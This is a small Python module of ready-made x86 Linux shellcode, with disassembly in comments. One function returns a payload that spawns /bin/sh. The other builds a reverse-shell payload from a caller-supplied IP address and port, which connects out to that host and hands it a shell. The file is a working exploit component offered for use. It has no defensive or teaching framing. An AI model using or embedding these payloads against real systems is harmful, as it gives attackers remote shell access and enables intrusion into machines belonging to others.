import struct

def execve() :
    return "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
    '''
    0xbffffca1:     xor    %eax,%eax
    0xbffffca3:     push   %eax
    0xbffffca4:     push   $0x68732f2f
    0xbffffca9:     push   $0x6e69622f
    0xbffffcae:     mov    %esp,%ebx
    0xbffffcb0:     push   %eax
    0xbffffcb1:     push   %ebx
    0xbffffcb2:     mov    %esp,%ecx
    0xbffffcb4:     mov    %eax,%edx
    0xbffffcb6:     mov    $0xb,%al
    0xbffffcb8:     int    $0x80
    '''

def remote(ipStr, portNum) :
    ipList = ipStr.split('.')
    IP = chr(int(ipList[0])) + chr(int(ipList[1])) + chr(int(ipList[2])) + chr(int(ipList[3]))
    PORT = struct.pack(">H", int(portNum))

    return "\x68" + IP + "\x5e\x66\x68" + PORT + "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"
    '''
    0xb775b000:	push   0x8495a8c0   // IP
    0xb775b005:	pop    esi
    0xb775b006:	pushw  0x697a       // PORT
    0xb775b00a:	pop    edi
    0xb775b00b:	push   0x66
    0xb775b00d:	pop    eax
    0xb775b00e:	cdq    
    0xb775b00f:	push   0x1
    0xb775b011:	pop    ebx
    0xb775b012:	push   edx
    0xb775b013:	push   ebx
    0xb775b014:	push   0x2
    0xb775b016:	mov    ecx,esp
    0xb775b018:	int    0x80
    0xb775b01a:	xchg   ebx,eax
    0xb775b01b:	pop    ecx
    0xb775b01c:	mov    al,0x3f
    0xb775b01e:	int    0x80
    0xb775b020:	dec    ecx
    0xb775b021:	jns    0xb775b01c
    0xb775b023:	mov    al,0x66
    0xb775b025:	push   esi
    0xb775b026:	push   di
    0xb775b028:	pushw  0x2
    0xb775b02b:	mov    ecx,esp
    0xb775b02d:	push   0x10
    0xb775b02f:	push   ecx
    0xb775b030:	push   ebx
    0xb775b031:	mov    ecx,esp
    0xb775b033:	int    0x80
    0xb775b035:	mov    al,0xb
    0xb775b037:	push   edx
    0xb775b038:	push   0x68732f2f
    0xb775b03d:	push   0x6e69622f
    0xb775b042:	mov    ebx,esp
    0xb775b044:	push   edx
    0xb775b045:	push   ebx
    0xb775b046:	jmp    0xb775b016
    '''

